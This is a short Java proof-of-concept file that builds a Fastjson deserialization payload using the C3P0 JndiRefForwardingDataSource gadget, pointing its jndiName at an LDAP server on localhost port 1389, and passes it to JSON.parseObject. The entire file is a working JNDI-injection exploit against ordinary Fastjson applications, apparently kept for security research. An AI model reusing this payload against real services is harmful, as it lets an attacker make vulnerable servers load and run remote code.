package org.h3rmesk1t.C3P0;

import com.alibaba.fastjson.JSON;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/17 3:34 下午
 */
public class C3P0JNDI {

    public static void main(String[] args) throws Exception {

        String poc = "{\"@type\": \"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",\n"+"\"jndiName\": \"ldap://127.0.0.1:1389/ciedhl\",\n"+"\"loginTimeout\": 0}";
        JSON.parseObject(poc);
    }

}
